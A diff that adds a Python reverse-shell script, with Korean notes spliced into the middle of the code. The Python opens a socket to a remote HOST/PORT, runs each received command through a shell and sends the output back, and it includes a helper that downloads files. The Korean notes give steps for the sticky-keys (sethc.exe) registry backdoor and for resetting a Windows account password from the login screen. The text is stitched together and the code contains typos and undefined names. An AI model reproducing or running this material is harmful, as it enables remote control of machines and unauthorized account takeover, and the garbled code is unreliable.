@@ -1,0 +1,43 @@
+import socket
+import subprocess
+import threading
+import urlib2
+import zlib
+import tempfile
+import os
+def wget(url, fname=None):
+    if not fname:
+        fname = url.split('/')[-1]
+    try:
+        urllib.urlretrieve(url, tempfile.gettempdir() + os.sep + fname)
+    except:
+        pass
+def runner(s, cmd):
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    except:
+        pass
+    out = zlib.compress(proc.stdout.read() + proc.stderr.read())
+    s.send(out)
+    return
+[Windows 로그인 상태에서]
+1. REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe"
+[재부팅 후 로그인 입력창에서 shift키를 5번 클릭 후]
+2. whoami  // 현재 어떤 계정인지 보여준다.
+3. explorer // 밑에 시작버튼도 뜨고 Alt + Tab을 누르면 바탕화면으로 전환된다.
+4. net user (로그인시 ID) (바꾸고 싶은 비밀번호) // windows 계정 비밀번호를 바꾸어 준다
+threads = []
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    s.connect((HOST, PORT))
+except:
+    s.send('[-] Connection Failed')
+else:
+    s.send('[+] Connection Established!')
+while True:
+    data = s.recv(1024)
+    if data == "quit":break
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    out = proc.stdout.read() + proc.stder.read()
+    s.send(out)
+s.close()
